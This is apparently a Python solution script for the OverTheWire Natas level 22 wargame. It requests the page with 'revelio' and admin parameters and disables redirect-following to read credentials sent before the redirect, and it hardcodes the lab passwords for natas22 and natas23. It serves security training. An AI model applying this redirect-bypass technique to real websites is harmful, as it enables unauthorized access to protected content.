#!/usr/bin/env python

import requests
from bs4 import BeautifulSoup

username = "natas22"
password = "chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ"

url = (
    "http://%s.natas.labs.overthewire.org/?debug=true&submit=1&admin=1&revelio"
    % username
)

session = requests.Session()

response = session.get(url, auth=(username, password), allow_redirects=False)
content = response.text

soup = BeautifulSoup(content, "html.parser").prettify()

print(soup)
print("=" * 80)


# this time we got an /index-source.html
# we just need to add revelio&admin=1 to the get request and as we do it fro the
# script we need to stop following the redirection in order to see the credits
#
# we got it right:
# Username: natas23
# Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
